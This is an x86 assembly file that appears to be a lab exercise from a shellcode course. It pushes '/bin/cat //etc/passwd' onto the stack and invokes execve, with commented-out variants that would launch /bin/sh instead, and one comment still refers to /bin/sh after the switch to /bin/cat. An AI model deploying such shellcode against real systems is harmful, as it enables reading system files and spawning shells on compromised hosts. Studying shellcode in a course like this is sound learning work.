; Shellcode to exercise the SLAE execve lab
; Author: Pedro Rodrigues


global _start

section .text

_start:

	; zero-ing 3 registers in a row
 	xor ebx, ebx
 	mul ebx

	; NULL
	push ebx

	; "-c ls"
	;push 0x20202073
	;push 0x6c20632d
	; saving pointer to argv
	;mov ecx, esp

	; "//etc/passwd"
	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	; saving pointer to argv
	mov ecx, esp

	push eax

	; /bin/sh
	;push 0x68732f2f
	;push 0x6e69622f

	; /bin/cat
	push 0x7461632f
	push 0x6e69622f

	; Poiting EBX to this content
	lea ebx, [esp]

	; Pushing NULL to satisfy execve condition
	push eax

	; Pushing the address to the argv into the stack
	push ecx

	; Setting the address of /bin/sh
	push ebx

	; Poiting ECX to this content address
	mov ecx, esp

	; Calling syscall 11 - execve
 	mov al, 0xB
 	int 0x80